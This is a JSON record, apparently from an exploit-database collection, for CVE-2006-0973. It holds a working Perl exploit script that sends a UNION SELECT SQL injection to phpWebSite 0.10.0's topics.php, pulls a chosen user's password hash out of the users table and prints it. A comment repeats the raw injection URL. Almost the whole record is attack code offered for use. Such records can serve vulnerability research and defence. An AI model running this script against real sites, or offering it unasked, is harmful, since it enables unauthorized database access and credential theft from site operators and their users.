{
  "id": "1525",
  "title": "phpWebSite 0.10.0-full - &#039;topics.php&#039; SQL Injection",
  "cve": "CVE-2006-0973",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n# \r\n# advisory sent in by SnIpEr_SA (selfar2002[at]hotmail.com)\r\n# http://www.target.com/topics.php?op=viewtopic&topic=-1%20Union%20select%20name,name,pass,name%20From%20users%20where%20uid=1\r\n# ported by str0ke (milw0rm.com) from x97Rangs code (RST/GHC) http://rst.void.ru\r\n\r\nuse LWP::Simple;\r\n\r\n$serv     =  $ARGV[0];\r\n$path     =  $ARGV[1];\r\n$uid      =  $ARGV[2];\r\n\r\nsub usage\r\n {\r\n    print \"\\nUsage: $0 [server] [path] [username] \\n\";\r\n    print \"sever    -  URL\\n\";\r\n    print \"path     -  path to topics.php\\n\";\r\n    print \"uid      -  uid of the user\\n\\n\";\r\n    exit ();}\r\n\r\nsub work\r\n {\r\n    print qq(\r\n       ---------------------------------\r\n#==---[ phpWebSite topic SQL-Injection  |\r\n       ---------------------------------\\n\\n);&board}\r\n\r\nsub board\r\n {\r\n    $URL = sprintf(\"http://%s%s/topics.php?op=viewtopic&topic=-1+Union+select+name,name,pass,name+From+users+where+uid=%s\",$serv,$path,$uid);\r\n    $content = get \"$URL\";\r\n    if ($content =~ /(\\w{32})/){&showh;}else{print \"... One of those days :)\\n\";}}\r\n\r\nsub showh\r\n {\r\n    print \"[*] User: $uid Hash: $1\\n\\n\";}\r\n\r\nif (@ARGV != 3){&usage;}else{&work;}\r\n\r\n# milw0rm.com [2006-02-24]",
  "url": "https://www.exploit-db.com/exploits/1525"
}